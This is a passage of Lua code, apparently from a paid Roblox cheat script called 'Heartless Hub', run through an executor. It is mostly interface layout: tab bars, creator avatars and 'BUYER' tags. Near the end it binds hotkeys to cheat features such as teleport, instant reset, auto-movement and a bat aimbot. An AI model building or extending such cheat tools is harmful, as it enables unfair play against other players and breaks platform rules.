        },{corner(8)})
        tabIndicators[name] = ind
        onAccent(function(a)
            if ind and ind.Parent then ind.BackgroundColor3 = a end
        end, ind)
        local b = new("TextButton",{
            Parent=parent,
            Size=UDim2.new(1,0,h,0),
            Position=UDim2.new(0,0,h*(index-1),0),
            BackgroundTransparency=1,
            BorderSizePixel=0,
            AutoButtonColor=false,
            Text=name,
            Font=Enum.Font.GothamBold,
            TextSize=(total >= 4) and 11 or 12,
            TextWrapped=true,
            TextColor3=Color3.fromRGB(130,130,130),
            ZIndex=2,
        })
        tabButtons[name] = b
        b.MouseButton1Click:Connect(function() selectTab(name) end)
    end

    local function clearSideChrome()
        for _,ch in ipairs(sideChromeFolder:GetChildren()) do
            pcall(function() ch:Destroy() end)
        end
        tabButtons = {}
        tabIndicators = {}
    end

    local function applyMainSizeForLayout(mode)
        mode = tonumber(mode) or 1
        if not main or not main.Parent then return end
        local target
        if mode == 4 then
            target = UDim2.fromOffset(420, 540)
        elseif mode == 3 then
            target = UDim2.fromOffset(410, 560)
        else
            target = UDim2.fromOffset(420, 580)
        end
        TweenService:Create(main, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = target
        }):Play()
        if body and body.Parent then
            if mode == 4 then
                body.Position = UDim2.fromOffset(14, 104)
                body.Size = UDim2.new(1, -28, 1, -140)
            elseif mode == 3 then
                body.Position = UDim2.fromOffset(16, 88)
                body.Size = UDim2.new(1, -32, 1, -140)
            else
                body.Position = UDim2.fromOffset(14, 76)
                body.Size = UDim2.new(1, -28, 1, -140) -- space for bottom tab bar
            end
        end
        if hubTitleLbl and hubTitleLbl.Parent then
            if mode == 4 then
                hubTitleLbl.Visible = false
            elseif mode == 3 then
                hubTitleLbl.Visible = true
                hubTitleLbl.Text = "Heartless Hub"
                hubTitleLbl.TextSize = 13
                hubTitleLbl.Size = UDim2.fromOffset(70, 18)
                hubTitleLbl.Position = UDim2.new(0.5, -35, 0, 42)
                hubTitleLbl.TextXAlignment = Enum.TextXAlignment.Center
                hubTitleLbl.ZIndex = 3
            else
                hubTitleLbl.Visible = true
                hubTitleLbl.Text = "Heartless Hub"
                hubTitleLbl.TextSize = 22
                hubTitleLbl.Size = UDim2.new(1, -60, 0, 28)
                hubTitleLbl.Position = UDim2.fromOffset(16, 12)
                hubTitleLbl.TextXAlignment = Enum.TextXAlignment.Left
                hubTitleLbl.ZIndex = 2
            end
        end
        if hubSubLbl and hubSubLbl.Parent then
            hubSubLbl.Visible = true; hubSubLbl.Text = ".gg/heartless"
        end
        if header and header.Parent then
            if mode == 4 then
                header.Size = UDim2.new(1, 0, 0, 4)
            elseif mode == 3 then
                header.Size = UDim2.new(1, 0, 0, 70)
            else
                header.Size = UDim2.new(1, 0, 0, 70)
            end
        end
        local cb = _oceanCloseBtn
        if cb and cb.Parent then
            if mode == 3 then
                cb.Size = UDim2.fromOffset(26, 26)
                cb.Position = UDim2.new(1, -34, 0, 42)
            elseif mode == 4 then
                cb.Size = UDim2.fromOffset(24, 24)
                cb.Position = UDim2.new(1, -32, 0, 20)
            else
                cb.Size = UDim2.fromOffset(26, 26)
                cb.Position = UDim2.new(1, -34, 0, 10)
            end
            cb.ZIndex = 200
            cb.Visible = true
        end
    end

    local function buildSideChrome(mode)
        mode = 1
        uiLayoutMode = 1
        clearSideChrome()
        local keep = current or "Speed"
        pcall(function() applyMainSizeForLayout(1) end)

        -- BOTTOM TABS (forced) — parented to main so they always show
        do
            local oldBar = main:FindFirstChild("BottomTabBar")
            if oldBar then pcall(function() oldBar:Destroy() end) end

            local tabs = {"Speed", "Movement", "Combat", "Settings"}
            local TAB_H = 48
            local tabBar = new("Frame",{
                Parent = main,
                Name = "BottomTabBar",
                Position = UDim2.new(0, 10, 1, -(TAB_H + 8)),
                Size = UDim2.new(1, -20, 0, TAB_H),
                BackgroundColor3 = Color3.fromRGB(8, 8, 10),
                BackgroundTransparency = 0.25,
                BorderSizePixel = 0,
                ZIndex = 80,
            },{corner(14), stroke(Color3.fromRGB(50,55,70),1,0.4)})

            local segW = 1 / #tabs
            local indicator = new("Frame",{
                Parent = tabBar,
                Name = "Indicator",
                Size = UDim2.new(segW, -8, 1, -10),
                Position = UDim2.new(0, 4, 0, 5),
                BackgroundColor3 = ACCENT_COLOR,
                BackgroundTransparency = 0.4,
                BorderSizePixel = 0,
                ZIndex = 81,
            },{corner(10)})
            onAccent(function(a)
                if indicator and indicator.Parent then indicator.BackgroundColor3 = a end
            end, indicator)

            local function paintTabs(activeName)
                local idx = 1
                for i, n in ipairs(tabs) do
                    if n == activeName then idx = i break end
                end
                pcall(function()
                    TweenService:Create(indicator, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                        Position = UDim2.new(segW * (idx - 1), 4, 0, 5)
                    }):Play()
                end)
                for n, btn in pairs(tabButtons) do
                    if btn and btn.Parent then
                        local active = n == activeName
                        btn.TextColor3 = active and Color3.fromRGB(255,255,255) or Color3.fromRGB(150,150,160)
                        btn.Font = active and Enum.Font.GothamBold or Enum.Font.GothamMedium
                    end
                end
            end

            for i, name in ipairs(tabs) do
                local b = new("TextButton",{
                    Parent = tabBar,
                    Name = "Tab_" .. name,
                    Size = UDim2.new(segW, 0, 1, 0),
                    Position = UDim2.new(segW * (i - 1), 0, 0, 0),
                    BackgroundTransparency = 1,
                    BorderSizePixel = 0,
                    AutoButtonColor = false,
                    Text = name,
                    Font = Enum.Font.GothamMedium,
                    TextSize = 12,
                    TextColor3 = Color3.fromRGB(150, 150, 160),
                    ZIndex = 82,
                })
                tabButtons[name] = b
                b.MouseButton1Click:Connect(function()
                    selectTab(name)
                    paintTabs(name)
                end)
            end

            local keepName = keep
            if not builders[keepName] then keepName = "Speed" end
            paintTabs(keepName)
            selectTab(keepName)
            return -- skip side credits / dual layouts
        end

        if mode == 4 then
            local avatarId = tostring(LP.UserId)
            local displayName = tostring(LP.DisplayName or LP.Name)

            -- top identity bar
            local idBar = new("Frame",{
                Parent=sideChromeFolder,
                Size=UDim2.new(1, -16, 0, 52),
                Position=UDim2.fromOffset(8, 6),
                BackgroundColor3=Color3.fromRGB(8,10,16),
                BackgroundTransparency=0.05,
                BorderSizePixel=0,
                ZIndex=12,
            },{corner(14), stroke(ACCENT_COLOR, 1.4, 0.35)})
            onAccent(function(a)
                local s = idBar:FindFirstChildOfClass("UIStroke")
                if s then s.Color = a end
            end, idBar)

            local selfAv = new("ImageLabel",{
                Parent=idBar,
                Size=UDim2.fromOffset(36, 36),
                Position=UDim2.fromOffset(8, 8),
                BackgroundColor3=Color3.fromRGB(16,18,26),
                BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=" .. avatarId .. "&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop,
                ZIndex=13,
            },{corner(10)})
            local selfAvS = stroke(ACCENT_COLOR, 1.5, 0.2)
            selfAvS.Parent = selfAv
            onAccent(function(a) selfAvS.Color = a end, selfAv)

            new("TextLabel",{
                Parent=idBar,
                Size=UDim2.new(1, -120, 0, 16),
                Position=UDim2.fromOffset(52, 8),
                BackgroundTransparency=1,
                Text=displayName,
                Font=Enum.Font.GothamBlack,
                TextSize=13,
                TextColor3=Color3.fromRGB(245,245,250),
                TextXAlignment=Enum.TextXAlignment.Left,
                TextTruncate=Enum.TextTruncate.AtEnd,
                ZIndex=13,
            })
            new("TextLabel",{
                Parent=idBar,
                Size=UDim2.new(1, -120, 0, 14),
                Position=UDim2.fromOffset(52, 26),
                BackgroundTransparency=1,
                Text="@" .. tostring(LP.Name),
                Font=Enum.Font.Gotham,
                TextSize=11,
                TextColor3=Color3.fromRGB(140,148,165),
                TextXAlignment=Enum.TextXAlignment.Left,
                TextTruncate=Enum.TextTruncate.AtEnd,
                ZIndex=13,
            })

            -- DUEL BUYER tag
            local tag = new("Frame",{
                Parent=idBar,
                Size=UDim2.fromOffset(72, 20),
                Position=UDim2.new(1, -112, 0.5, -10),
                BackgroundColor3=ACCENT_COLOR,
                BorderSizePixel=0,
                ZIndex=14,
            },{corner(8)})
            onAccent(function(a) tag.BackgroundColor3 = a end, tag)
            new("TextLabel",{
                Parent=tag,
                Size=UDim2.fromScale(1,1),
                BackgroundTransparency=1,
                Text="DUEL BUYER",
                Font=Enum.Font.GothamBlack,
                TextSize=9,
                TextColor3=Color3.fromRGB(12,12,16),
                ZIndex=15,
            })

            -- tab rail under identity
            local rail = new("Frame",{
                Parent=sideChromeFolder,
                Size=UDim2.new(1, -16, 0, 34),
                Position=UDim2.fromOffset(8, 64),
                BackgroundColor3=Color3.fromRGB(10,12,18),
                BackgroundTransparency=0.08,
                BorderSizePixel=0,
                ZIndex=12,
            },{corner(12), stroke(Color3.fromRGB(40,45,60), 1, 0.4)})
            local tabs = {"Speed","Movement","Combat","Settings"}
            for i, name in ipairs(tabs) do
                local chip = new("TextButton",{
                    Parent=rail,
                    Size=UDim2.new(1/#tabs, -4, 1, -6),
                    Position=UDim2.new((i-1)*(1/#tabs), 2, 0, 3),
                    BackgroundColor3=Color3.fromRGB(16,18,26),
                    BackgroundTransparency=0.2,
                    BorderSizePixel=0,
                    AutoButtonColor=false,
                    Text=name,
                    Font=Enum.Font.GothamBold,
                    TextSize=10,
                    TextColor3=Color3.fromRGB(160,168,185),
                    ZIndex=13,
                },{corner(9)})
                tabButtons[name] = chip
                local glow = new("Frame",{
                    Parent=chip,
                    Size=UDim2.new(0.5,0,0,2),
                    Position=UDim2.new(0.25,0,1,-2),
                    BackgroundColor3=ACCENT_COLOR,
                    BackgroundTransparency=1,
                    BorderSizePixel=0,
                    ZIndex=14,
                })
                tabIndicators[name] = glow
                onAccent(function(a)
                    if glow and glow.Parent then glow.BackgroundColor3 = a end
                    if current == name then
                        chip.BackgroundColor3 = a
                        chip.TextColor3 = accentTextColor(a)
                    end
                end, chip)
                chip.MouseEnter:Connect(function()
                    if current ~= name then
                        TweenService:Create(chip, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(26,30,42)}):Play()
                    end
                end)
                chip.MouseLeave:Connect(function()
                    if current ~= name then
                        TweenService:Create(chip, TweenInfo.new(0.15), {
                            BackgroundColor3=Color3.fromRGB(16,18,26),
                            TextColor3=Color3.fromRGB(160,168,185),
                        }):Play()
                    end
                end)
                chip.MouseButton1Click:Connect(function() selectTab(name) end)
            end

            -- creator avatars strip (bottom)
            local strip = new("Frame",{
                Parent=sideChromeFolder,
                Size=UDim2.new(1, -16, 0, 28),
                Position=UDim2.new(0, 8, 1, -34),
                BackgroundTransparency=1,
                ZIndex=12,
            })
            local creators = {
                {id=1455390178, tip="Octavian"},
                {id=3884286603, tip="David"},
            }
            for i, c in ipairs(creators) do
                local av = new("ImageLabel",{
                    Parent=strip,
                    Size=UDim2.fromOffset(22, 22),
                    Position=UDim2.fromOffset((i-1)*26, 3),
                    BackgroundColor3=Color3.fromRGB(20,22,28),
                    BorderSizePixel=0,
                    Image="rbxthumb://type=AvatarHeadShot&id=" .. tostring(c.id) .. "&w=150&h=150",
                    ScaleType=Enum.ScaleType.Crop,
                    ZIndex=13,
                },{corner(11)})
                local st = stroke(ACCENT_COLOR, 1, 0.3)
                st.Parent = av
                onAccent(function(a) st.Color = a end, av)
            end
            new("TextLabel",{
                Parent=strip,
                Size=UDim2.new(1, -60, 1, 0),
                Position=UDim2.fromOffset(56, 0),
                BackgroundTransparency=1,
                Text="Heartless Hub  ·  Duels",
                Font=Enum.Font.GothamBold,
                TextSize=10,
                TextColor3=Color3.fromRGB(120,128,145),
                TextXAlignment=Enum.TextXAlignment.Left,
                ZIndex=13,
            })

                elseif mode == 3 then
            -- OPTION 3: corner tabs, compact window
            local corners = {
                {name="Speed",    pos=UDim2.new(0, 8, 0, 8)},
                {name="Movement", pos=UDim2.new(1, -78, 0, 8)},
                {name="Combat",   pos=UDim2.new(0, 8, 1, -40)},
                {name="Settings", pos=UDim2.new(1, -78, 1, -40)},
            }
            for _, info in ipairs(corners) do
                local chip = new("TextButton",{
                    Parent=sideChromeFolder,
                    Size=UDim2.fromOffset(70, 28),
                    Position=info.pos,
                    BackgroundColor3=Color3.fromRGB(16,18,26),
                    BackgroundTransparency=0,
                    BorderSizePixel=0,
                    AutoButtonColor=false,
                    Text=info.name,
                    Font=Enum.Font.GothamBold,
                    TextSize=11,
                    TextColor3=Color3.fromRGB(180,185,200),
                    ZIndex=20,
                },{corner(14), stroke(Color3.fromRGB(55,60,75),1.2,0.3)})
                -- keep label readable always
                local tStroke = Instance.new("UIStroke")
                tStroke.Thickness = 0.6
                tStroke.Color = Color3.fromRGB(0,0,0)
                tStroke.Transparency = 0.55
                tStroke.Parent = chip
                tabButtons[info.name] = chip
                local glow = new("Frame",{
                    Parent=chip,
                    Size=UDim2.new(1,-10,0,2),
                    Position=UDim2.new(0,5,1,-3),
                    BackgroundColor3=ACCENT_COLOR,
                    BackgroundTransparency=1,
                    BorderSizePixel=0,
                    ZIndex=21,
                },{corner(1)})
                tabIndicators[info.name] = glow
                onAccent(function(a)
                    if glow and glow.Parent then glow.BackgroundColor3 = a end
                    if current == info.name then
                        chip.BackgroundColor3 = a
                        chip.TextColor3 = accentTextColor(a)
                    end
                end, chip)
                chip.MouseEnter:Connect(function()
                    if current ~= info.name then
                        TweenService:Create(chip, TweenInfo.new(0.12), {BackgroundColor3=Color3.fromRGB(28,32,44)}):Play()
                    end
                end)
                chip.MouseLeave:Connect(function()
                    if current ~= info.name then
                        TweenService:Create(chip, TweenInfo.new(0.16), {
                            BackgroundColor3=Color3.fromRGB(16,18,26),
                            TextColor3=Color3.fromRGB(180,185,200),
                        }):Play()
                    end
                end)
                chip.MouseButton1Click:Connect(function()
                    selectTab(info.name)
                end)
            end

            -- Credits (OPT 3 only)
            local creditLbl = new("TextLabel",{
                Parent=sideChromeFolder,
                Size=UDim2.new(1, -20, 0, 16),
                Position=UDim2.new(0, 10, 1, -58),
                BackgroundTransparency=1,
                Text="CREDITS TO k1sregele ON DISCORD!",
                Font=Enum.Font.GothamBold,
                TextSize=10,
                TextColor3=Color3.fromRGB(160, 165, 180),
                TextXAlignment=Enum.TextXAlignment.Center,
                ZIndex=15,
            })
            onAccent(function(a)
                creditLbl.TextColor3 = Color3.new(
                    math.clamp(a.R * 0.55 + 0.35, 0, 1),
                    math.clamp(a.G * 0.55 + 0.35, 0, 1),
                    math.clamp(a.B * 0.55 + 0.35, 0, 1)
                )
            end, creditLbl)

        elseif mode == 1 then
            local tabBarLeft = new("Frame",{
                Parent=sideChromeFolder,
                Position=UDim2.new(0,6,0,100),
                Size=UDim2.new(0,68,0,220),
                BackgroundColor3=Color3.fromRGB(14,14,14),
                BackgroundTransparency=0.08,
                BorderSizePixel=0,
                ZIndex=5,
            },{corner(10), stroke(Color3.fromRGB(40,40,40),1,0.35)})
            local allTabs = {"Speed","Movement","Combat","Settings"}
            for i,name in ipairs(allTabs) do makeSideTab(tabBarLeft, name, i, #allTabs) end

            local rightPanel = new("Frame",{
                Parent=sideChromeFolder,
                Position=UDim2.new(1,-86,0,96),
                Size=UDim2.new(0,80,0,400),
                BackgroundTransparency=1,
                BorderSizePixel=0,
                ZIndex=5,
            })
            local avL = new("ImageLabel",{
                Parent=rightPanel, Size=UDim2.fromOffset(34,34), Position=UDim2.new(0.5,-17,0,0),
                BackgroundColor3=Color3.fromRGB(20,20,24), BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=1455390178&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop, ZIndex=6,
            },{corner(24)})
            local avLStroke = stroke(ACCENT_COLOR, 2, 0); avLStroke.Parent = avL
            onAccent(function(a) avLStroke.Color = a end, avL)
            new("TextLabel",{
                Parent=rightPanel, Size=UDim2.new(1,0,0,30), Position=UDim2.fromOffset(0,44),
                BackgroundTransparency=1, Text="", Font=Enum.Font.GothamBold,
                TextSize=9, TextColor3=Color3.fromRGB(200,200,210), TextWrapped=true,
                TextYAlignment=Enum.TextYAlignment.Top, TextXAlignment=Enum.TextXAlignment.Center, ZIndex=6,
            })
            local avR = new("ImageLabel",{
                Parent=rightPanel, Size=UDim2.fromOffset(34,34), Position=UDim2.new(0.5,-17,0,78),
                BackgroundColor3=Color3.fromRGB(20,20,24), BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=3884286603&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop, ZIndex=6,
            },{corner(24)})
            local avRStroke = stroke(ACCENT_COLOR, 2, 0); avRStroke.Parent = avR
            onAccent(function(a) avRStroke.Color = a end, avR)
            new("TextLabel",{
                Parent=rightPanel, Size=UDim2.new(1,0,0,28), Position=UDim2.fromOffset(0,132),
                BackgroundTransparency=1, Text="", Font=Enum.Font.GothamBold,
                TextSize=9, TextColor3=Color3.fromRGB(200,200,210), TextWrapped=true,
                TextYAlignment=Enum.TextYAlignment.Top, TextXAlignment=Enum.TextXAlignment.Center, ZIndex=6,
            })
            new("TextLabel",{
                Parent=rightPanel, Size=UDim2.new(1,-4,0,34), Position=UDim2.fromOffset(2,172),
                BackgroundTransparency=1, Text="", Font=Enum.Font.GothamMedium,
                TextSize=8, TextColor3=Color3.fromRGB(170,175,185), TextWrapped=true,
                TextXAlignment=Enum.TextXAlignment.Center, ZIndex=6,
            })
            local buyerTag = new("TextLabel",{
                Parent=rightPanel, Size=UDim2.new(1,-8,0,18), Position=UDim2.fromOffset(4,210),
                BackgroundColor3=ACCENT_COLOR, BackgroundTransparency=0.15, Text="BUYER!",
                Font=Enum.Font.GothamBlack, TextSize=10, TextColor3=accentTextColor(ACCENT_COLOR),
                TextXAlignment=Enum.TextXAlignment.Center, TextYAlignment=Enum.TextYAlignment.Center, ZIndex=6,
            },{corner(6)})
            onAccent(function(a) buyerTag.BackgroundColor3=a; buyerTag.TextColor3=accentTextColor(a) end, buyerTag)
            local executorId = LP.UserId
            local executorName = LP.DisplayName or LP.Name
            local buyerBox = new("Frame",{
                Parent=rightPanel, Position=UDim2.fromOffset(2,234), Size=UDim2.new(1,-4,0,28),
                BackgroundColor3=Color3.fromRGB(12,12,14), BackgroundTransparency=0.25, BorderSizePixel=0, ZIndex=6,
            },{corner(6), stroke(Color3.fromRGB(45,45,50),1,0.4)})
            local botSelf = new("ImageLabel",{
                Parent=buyerBox, Size=UDim2.fromOffset(18,18), Position=UDim2.fromOffset(4,5),
                BackgroundColor3=Color3.fromRGB(20,20,24), BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=" .. tostring(executorId) .. "&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop, ZIndex=7,
            },{corner(9)})
            local botSelfS = stroke(ACCENT_COLOR, 1, 0); botSelfS.Parent = botSelf
            onAccent(function(a) botSelfS.Color = a end, botSelf)
            new("TextLabel",{
                Parent=buyerBox, Size=UDim2.new(1,-28,1,0), Position=UDim2.fromOffset(26,0),
                BackgroundTransparency=1, Text=tostring(executorName), Font=Enum.Font.GothamBold,
                TextSize=8, TextColor3=Color3.fromRGB(220,220,230), TextXAlignment=Enum.TextXAlignment.Left,
                TextTruncate=Enum.TextTruncate.AtEnd, ZIndex=7,
            })
            local warnBox = new("Frame",{
                Parent=rightPanel, Position=UDim2.fromOffset(2,268), Size=UDim2.new(1,-4,0,28),
                BackgroundColor3=Color3.fromRGB(18,10,12), BackgroundTransparency=0.25, BorderSizePixel=0, ZIndex=6,
            },{corner(6)})
            local warnStroke = stroke(ACCENT_COLOR, 1, 0.15); warnStroke.Parent = warnBox
            local warnLbl = new("TextLabel",{
                Parent=warnBox, Size=UDim2.new(1,-4,1,-2), Position=UDim2.fromOffset(2,1),
                BackgroundTransparency=1, Text="", Font=Enum.Font.GothamBold,
                TextSize=7, TextColor3=ACCENT_COLOR, TextWrapped=true,
                TextXAlignment=Enum.TextXAlignment.Center, TextYAlignment=Enum.TextYAlignment.Center, ZIndex=7,
            })
            onAccent(function(a) warnStroke.Color=a; warnLbl.TextColor3=a end, warnBox)
            new("TextLabel",{
                Parent=rightPanel, Size=UDim2.new(1,-2,0,40), Position=UDim2.fromOffset(1,300),
                BackgroundTransparency=1, Text="Heartless Hub",
                Font=Enum.Font.GothamBold, TextSize=8, TextColor3=Color3.fromRGB(220,180,190),
                TextWrapped=true, TextXAlignment=Enum.TextXAlignment.Center, TextYAlignment=Enum.TextYAlignment.Top, ZIndex=6,
            })
        elseif mode == 2 then
            local leftTabs = {"Movement"}
            local rightTabs = {"Combat","Settings"}
            local tabBarLeft = new("Frame",{
                Parent=sideChromeFolder,
                Position=UDim2.new(0,6,0,100),
                Size=UDim2.new(0,68,0,120),
                BackgroundColor3=Color3.fromRGB(14,14,14),
                BackgroundTransparency=0.08,
                BorderSizePixel=0,
                ZIndex=5,
            },{corner(10), stroke(Color3.fromRGB(40,40,40),1,0.35)})
            local tabBarRight = new("Frame",{
                Parent=sideChromeFolder,
                Position=UDim2.new(1,-74,0,100),
                Size=UDim2.new(0,68,0,120),
                BackgroundColor3=Color3.fromRGB(14,14,14),
                BackgroundTransparency=0.08,
                BorderSizePixel=0,
                ZIndex=5,
            },{corner(10), stroke(Color3.fromRGB(40,40,40),1,0.35)})
            for i,name in ipairs(leftTabs) do makeSideTab(tabBarLeft, name, i, #leftTabs) end
            for i,name in ipairs(rightTabs) do makeSideTab(tabBarRight, name, i, #rightTabs) end

            local creditLeft = new("Frame",{
                Parent=sideChromeFolder,
                Position=UDim2.new(0,4,0,226),
                Size=UDim2.new(0,72,0,110),
                BackgroundTransparency=1,
                BorderSizePixel=0,
                ZIndex=5,
            })
            new("TextLabel",{
                Parent=creditLeft, Size=UDim2.new(1,0,0,28), Position=UDim2.fromOffset(0,0),
                BackgroundTransparency=1, Text="Heartless Hub",
                Font=Enum.Font.GothamBold, TextSize=9, TextColor3=Color3.fromRGB(200,200,210),
                TextWrapped=true, TextYAlignment=Enum.TextYAlignment.Top, ZIndex=6,
            })
            local avL = new("ImageLabel",{
                Parent=creditLeft, Size=UDim2.fromOffset(40,40), Position=UDim2.new(0.5,-20,0,34),
                BackgroundColor3=Color3.fromRGB(20,20,24), BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=1455390178&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop, ZIndex=6,
            },{corner(20)})
            local avLStroke = stroke(ACCENT_COLOR, 2, 0); avLStroke.Parent = avL
            onAccent(function(a) avLStroke.Color = a end, avL)
            new("TextLabel",{
                Parent=creditLeft, Size=UDim2.new(1,0,0,28), Position=UDim2.fromOffset(0,78),
                BackgroundTransparency=1, Text="Octavian", Font=Enum.Font.GothamMedium,
                TextSize=8, TextColor3=Color3.fromRGB(180,180,190), TextWrapped=true, ZIndex=6,
            })

            local creditRight = new("Frame",{
                Parent=sideChromeFolder,
                Position=UDim2.new(1,-76,0,226),
                Size=UDim2.new(0,72,0,110),
                BackgroundTransparency=1,
                BorderSizePixel=0,
                ZIndex=5,
            })
            new("TextLabel",{
                Parent=creditRight, Size=UDim2.new(1,0,0,28), Position=UDim2.fromOffset(0,0),
                BackgroundTransparency=1, Text="Heartless Hub",
                Font=Enum.Font.GothamBold, TextSize=9, TextColor3=Color3.fromRGB(200,200,210),
                TextWrapped=true, TextYAlignment=Enum.TextYAlignment.Top, ZIndex=6,
            })
            local avR = new("ImageLabel",{
                Parent=creditRight, Size=UDim2.fromOffset(40,40), Position=UDim2.new(0.5,-20,0,34),
                BackgroundColor3=Color3.fromRGB(20,20,24), BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=3884286603&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop, ZIndex=6,
            },{corner(20)})
            local avRStroke = stroke(ACCENT_COLOR, 2, 0); avRStroke.Parent = avR
            onAccent(function(a) avRStroke.Color = a end, avR)
            new("TextLabel",{
                Parent=creditRight, Size=UDim2.new(1,0,0,28), Position=UDim2.fromOffset(0,78),
                BackgroundTransparency=1, Text="davidboosr9", Font=Enum.Font.GothamMedium,
                TextSize=8, TextColor3=Color3.fromRGB(180,180,190), TextWrapped=true, ZIndex=6,
            })

            local executorId = LP.UserId
            local executorName = LP.DisplayName or LP.Name
            local bottomCredits = new("Frame",{
                Parent=sideChromeFolder,
                AnchorPoint=Vector2.new(0,1),
                Position=UDim2.new(0,4,1,-4),
                Size=UDim2.fromOffset(74,18),
                BackgroundColor3=Color3.fromRGB(12,12,14),
                BackgroundTransparency=0.3,
                BorderSizePixel=0,
                ZIndex=8,
            },{corner(5), stroke(Color3.fromRGB(45,45,50),1,0.4)})
            local botSelf = new("ImageLabel",{
                Parent=bottomCredits, Size=UDim2.fromOffset(12,12), Position=UDim2.fromOffset(3,3),
                BackgroundColor3=Color3.fromRGB(20,20,24), BorderSizePixel=0,
                Image="rbxthumb://type=AvatarHeadShot&id=" .. tostring(executorId) .. "&w=150&h=150",
                ScaleType=Enum.ScaleType.Crop, ZIndex=9,
            },{corner(6)})
            local botSelfS = stroke(ACCENT_COLOR, 1, 0); botSelfS.Parent = botSelf
            onAccent(function(a) botSelfS.Color = a end, botSelf)
            new("TextLabel",{
                Parent=bottomCredits, Size=UDim2.fromOffset(54,12), Position=UDim2.fromOffset(18,3),
                BackgroundTransparency=1, Text=tostring(executorName), Font=Enum.Font.GothamBold,
                TextSize=7, TextColor3=Color3.fromRGB(220,220,230), TextXAlignment=Enum.TextXAlignment.Left,
                TextTruncate=Enum.TextTruncate.AtEnd, ZIndex=9,
            })
            local warnBox = new("Frame",{
                Parent=sideChromeFolder,
                AnchorPoint=Vector2.new(1,1),
                Position=UDim2.new(1,-4,1,-4),
                Size=UDim2.fromOffset(92,18),
                BackgroundColor3=Color3.fromRGB(18,10,12),
                BackgroundTransparency=0.25,
                BorderSizePixel=0,
                ZIndex=8,
            },{corner(5)})
            local warnStroke = stroke(ACCENT_COLOR, 1, 0.15); warnStroke.Parent = warnBox
            local warnLbl = new("TextLabel",{
                Parent=warnBox, Size=UDim2.new(1,-4,1,-2), Position=UDim2.fromOffset(2,1),
                BackgroundTransparency=1, Text="", Font=Enum.Font.GothamBold,
                TextSize=7, TextColor3=ACCENT_COLOR, TextWrapped=true,
                TextXAlignment=Enum.TextXAlignment.Center, TextYAlignment=Enum.TextYAlignment.Center, ZIndex=9,
            })
            onAccent(function(a) warnStroke.Color=a; warnLbl.TextColor3=a end, warnBox)
        end

        selectTab(keep)
    end

    -- expose for Settings toggle
    applyUILayout = buildSideChrome
    buildSideChrome(uiLayoutMode or 1)

-- Toggle: Settings → Watermark ON/OFF
function destroyOceanWatermark()
    pcall(function()
        if watermarkGui and watermarkGui.Parent then
            watermarkGui:Destroy()
        end
    end)
    pcall(function()
        local function wipe(root)
            if not root then return end
            local g = root:FindFirstChild("OceanHubWatermark")
            if g then g:Destroy() end
        end
        wipe(LP and LP:FindFirstChild("PlayerGui"))
        if gethui then wipe(gethui()) end
        wipe(game:GetService("CoreGui"))
    end)
    watermarkGui = nil
    watermarkFrame = nil
end

function createOceanWatermark()
    pcall(destroyOceanWatermark)
end

local e01WarnGui = nil
function refreshE01Warn() end

task.defer(function()
    task.wait(0.35)
    pcall(createOceanWatermark)
    pcall(createHighPingWarn)
    pcall(refreshE01Warn)
end)

    selectTab("Speed")

    buildMobileButtons()
    updateLockButton()
    task.spawn(function()
        for _ = 1, 5 do
            task.wait(2)
            if fpsUnlocked and unlockFPS then pcall(unlockFPS, 999) end
        end
    end)

task.defer(function()
    task.wait(1)
    -- Always clear any leftover base skins
    if applyBaseTheme then pcall(applyBaseTheme, "Normal") end
    baseThemeMode = "Normal"
end)

    _PersistentActions = _PersistentActions or {}
    local function bindPersistent(keyName, actionName, fn)
        local kc = Enum.KeyCode[keyName]
        if not kc then return end
        _PersistentActions[actionName] = fn
        keybindMap[kc] = keybindMap[kc] or {}
        keybindMap[kc][actionName] = fn
        if _GuiKeys then _GuiKeys[actionName] = keyName end
    end
    local function resolveSavedKey(actionName, fallbackName)
        if _GuiKeys and type(_GuiKeys[actionName]) == "string" and Enum.KeyCode[_GuiKeys[actionName]] then
            return _GuiKeys[actionName]
        end
        if _SavedGuiKeys and type(_SavedGuiKeys[actionName]) == "string" and Enum.KeyCode[_SavedGuiKeys[actionName]] then
            return _SavedGuiKeys[actionName]
        end
        return fallbackName
    end

    local function toggleMainGui()
        if main.Visible then
            mainReopenBtn.Position = main.Position
            mainReopenBtn.Visible = true
            main.Visible = false
        else
            main.Visible = true
            mainReopenBtn.Visible = false
        end
    end

    do
        local guiKeyName = resolveSavedKey("Toggle GUI", "Insert")
        if KB and KB.GuiHide and KB.GuiHide.kb then
            guiKeyName = KB.GuiHide.kb.Name
        end
        bindPersistent(guiKeyName, "Toggle GUI", toggleMainGui)
        if KB and KB.GuiHide then
            KB.GuiHide.kb = Enum.KeyCode[guiKeyName]
        end
    end

    bindPersistent(resolveSavedKey("Drop Brainrot", "G"), "Drop Brainrot", function() runDrop() end)
    bindPersistent(resolveSavedKey("Instant Reset", "F"), "Instant Reset", function()
        if doInstantReset then doInstantReset() end
    end)
    bindPersistent(resolveSavedKey("TP Down", "T"), "TP Down", function() runTPFloor() end)
    bindPersistent(resolveSavedKey("Auto Left", "Z"), "Auto Left", function()
        if autoLeftEnabled then
            autoLeftEnabled = false; stopAutoLeft()
            if autoLeftSetVisual then autoLeftSetVisual(false) end
            if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
        else
            if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
            if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
